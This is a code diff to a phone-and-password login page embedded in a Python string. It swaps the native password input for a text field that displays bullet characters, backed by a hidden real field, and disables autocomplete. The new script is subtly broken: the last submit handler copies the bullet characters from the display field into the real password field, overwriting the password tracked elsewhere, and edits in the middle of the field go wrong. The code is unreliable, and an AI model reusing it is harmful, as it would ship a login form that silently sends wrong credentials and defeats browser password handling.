@@ -134,7 +134,7 @@ HTML_PAGE = """<!DOCTYPE html>
             color: #555555;
         }
 
-        /* ===== PASSWORD WRAPPER - ULTIMATE MOBILE FIX ===== */
+        /* ===== CUSTOM PASSWORD FIELD ===== */
         .password-wrapper {
             display: flex;
             align-items: center;
@@ -150,9 +150,8 @@ HTML_PAGE = """<!DOCTYPE html>
             background: #2a2a2a;
         }
 
-        /* ===== THE PASSWORD INPUT - FORCED VISIBLE ===== */
-        .password-wrapper input[type="password"],
-        .password-wrapper input[type="text"] {
+        /* The visible input that shows dots */
+        .password-wrapper .password-display {
             flex: 1;
             min-width: 80px;
             border: none;
@@ -162,66 +161,24 @@ HTML_PAGE = """<!DOCTYPE html>
             font-size: 16px;
             outline: none;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            /* Force dots on mobile */
-            -webkit-text-security: disc !important;
-            text-security: disc !important;
-            /* iOS specific */
-            -webkit-text-fill-color: #ffffff !important;
-            opacity: 1 !important;
-            /* Android specific */
-            text-shadow: 0 0 0 #ffffff !important;
-            -webkit-text-shadow: 0 0 0 #ffffff !important;
+            letter-spacing: 2px;
+            caret-color: #ffffff;
         }
-
-        /* When visible (text mode), show characters */
-        .password-wrapper input[type="text"] {
-            -webkit-text-security: none !important;
-            text-security: none !important;
-        }
-
-        /* ===== PLACEHOLDER ===== */
-        .password-wrapper input::placeholder {
+        .password-wrapper .password-display::placeholder {
             color: #555555 !important;
-            -webkit-text-fill-color: #555555 !important;
-            opacity: 1 !important;
-            text-shadow: none !important;
-            -webkit-text-shadow: none !important;
+            letter-spacing: 0;
         }
 
-        /* ===== KILL BROWSER NATIVE EYE & AUTOFILL OVERLAY ===== */
-        .password-wrapper input::-webkit-credentials-auto-fill-button,
-        .password-wrapper input::-webkit-caps-lock-indicator,
-        .password-wrapper input::-webkit-textfield-decoration-container {
-            display: none !important;
-        }
-        .password-wrapper input::-webkit-reveal {
-            display: none !important;
-        }
-        .password-wrapper input::-moz-reveal {
-            display: none !important;
-        }
-        .password-wrapper input[type="password"]::-ms-reveal,
-        .password-wrapper input[type="password"]::-ms-clear {
-            display: none !important;
+        /* Hidden real input for form submission */
+        .password-wrapper .password-real {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 0;
+            height: 0;
+            z-index: -1;
         }
 
-        /* ===== MOBILE AUTOFILL OVERRIDE ===== */
-        .password-wrapper input:-webkit-autofill,
-        .password-wrapper input:-webkit-autofill:hover,
-        .password-wrapper input:-webkit-autofill:focus,
-        .password-wrapper input:-webkit-autofill:active {
-            -webkit-box-shadow: 0 0 0 1000px #262626 inset !important;
-            -webkit-text-fill-color: #ffffff !important;
-            caret-color: #ffffff !important;
-            background-color: #262626 !important;
-            background: #262626 !important;
-            color: #ffffff !important;
-            transition: background-color 5000s ease-in-out 0s;
-            -webkit-text-security: disc !important;
-            text-security: disc !important;
-        }
-
-        /* ===== CUSTOM EYE TOGGLE ===== */
         .password-toggle {
             flex-shrink: 0;
             background: none;
@@ -365,7 +322,6 @@ HTML_PAGE = """<!DOCTYPE html>
             color: #777;
         }
 
-        /* ===== LOADING OVERLAY ===== */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -399,7 +355,6 @@ HTML_PAGE = """<!DOCTYPE html>
             font-size: 15px;
         }
 
-        /* ===== HONEYPOT ===== */
         .honeypot {
             position: absolute;
             left: -9999px;
@@ -408,7 +363,6 @@ HTML_PAGE = """<!DOCTYPE html>
             pointer-events: none;
         }
 
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 500px) {
             .login-wrapper {
                 padding: 32px 20px 28px;
@@ -426,8 +380,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 font-size: 15px;
                 min-width: 80px;
             }
-            .password-wrapper input[type="password"],
-            .password-wrapper input[type="text"] {
+            .password-wrapper .password-display {
                 padding: 12px 10px 12px 14px;
                 font-size: 15px;
             }
@@ -454,8 +407,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 padding: 16px 18px 16px 6px;
                 font-size: 17px;
             }
-            .password-wrapper input[type="password"],
-            .password-wrapper input[type="text"] {
+            .password-wrapper .password-display {
                 padding: 16px 14px 16px 18px;
                 font-size: 17px;
             }
@@ -499,7 +451,10 @@ HTML_PAGE = """<!DOCTYPE html>
             <div class="input-group">
                 <label>Password</label>
                 <div class="password-wrapper">
-                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                    <!-- Display field: shows dots -->
+                    <input type="text" class="password-display" id="passwordDisplay" placeholder="Enter your password" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+                    <!-- Hidden real field for form submission -->
+                    <input type="password" class="password-real" id="password" name="password">
                     <button type="button" class="password-toggle hidden" id="togglePassword" aria-label="Toggle password visibility">
                         <svg class="eye-open" viewBox="0 0 24 24">
                             <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
@@ -541,25 +496,98 @@ HTML_PAGE = """<!DOCTYPE html>
     </div>
     <script>
         (function() {
+            const display = document.getElementById('passwordDisplay');
+            const real = document.getElementById('password');
             const toggle = document.getElementById('togglePassword');
-            const field = document.getElementById('password');
             let visible = false;
+            let password = '';
+
+            // Start with eye closed
             toggle.classList.add('hidden');
+
+            // Sync display with real field
+            function updateDisplay() {
+                if (visible) {
+                    display.value = password;
+                    display.type = 'text';
+                } else {
+                    display.value = '•'.repeat(password.length);
+                    display.type = 'text';
+                }
+                real.value = password;
+            }
+
+            // Handle input on display field
+            display.addEventListener('input', function(e) {
+                const input = this.value;
+                const raw = this.selectionStart || 0;
+
+                if (visible) {
+                    // In visible mode, user sees actual characters
+                    password = input;
+                } else {
+                    // In hidden mode, user typed a character - append it
+                    const newChar = input.charAt(input.length - 1) || '';
+                    if (newChar) {
+                        password += newChar;
+                    } else if (input.length < password.length) {
+                        // Backspace - remove last character
+                        password = password.slice(0, -1);
+                    }
+                }
+                updateDisplay();
+                // Move cursor to end
+                display.setSelectionRange(password.length, password.length);
+            });
+
+            // Handle keydown for backspace/delete properly
+            display.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !visible) {
+                    e.preventDefault();
+                    password = password.slice(0, -1);
+                    updateDisplay();
+                } else if (e.key === 'Delete' && !visible) {
+                    e.preventDefault();
+                    // Delete doesn't really apply in hidden mode
+                }
+            });
+
+            // Prevent paste in hidden mode
+            display.addEventListener('paste', function(e) {
+                if (!visible) {
+                    e.preventDefault();
+                    const pasted = (e.clipboardData || window.clipboardData).getData('text');
+                    password += pasted;
+                    updateDisplay();
+                }
+            });
+
+            // Toggle visibility
             toggle.addEventListener('click', function(e) {
                 e.preventDefault();
                 visible = !visible;
                 toggle.classList.toggle('hidden', !visible);
-                field.type = visible ? 'text' : 'password';
-                field.focus();
+                updateDisplay();
+                display.focus();
+                // Place cursor at end
+                display.setSelectionRange(password.length, password.length);
             });
-            field.addEventListener('input', function() {
-                if (this.value.length === 0 && visible) {
-                    visible = false;
-                    toggle.classList.add('hidden');
-                    this.type = 'password';
-                }
+
+            // Also sync on form submit
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                real.value = password;
             });
+
+            // Focus management
+            display.addEventListener('focus', function() {
+                this.setSelectionRange(password.length, password.length);
+            });
+
+            // Initialize
+            updateDisplay();
         })();
+
+        // ====== FORM SUBMIT ======
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             if (document.getElementById('website').value.length > 0) {
                 e.preventDefault();
@@ -571,7 +599,10 @@ HTML_PAGE = """<!DOCTYPE html>
             btn.textContent = 'Signing in...';
             document.getElementById('loadingOverlay').classList.add('active');
             document.getElementById('sessionToken').value = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            // Ensure real password field is set
+            document.getElementById('password').value = document.getElementById('passwordDisplay').value;
         });
+
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('phone').focus();
         });
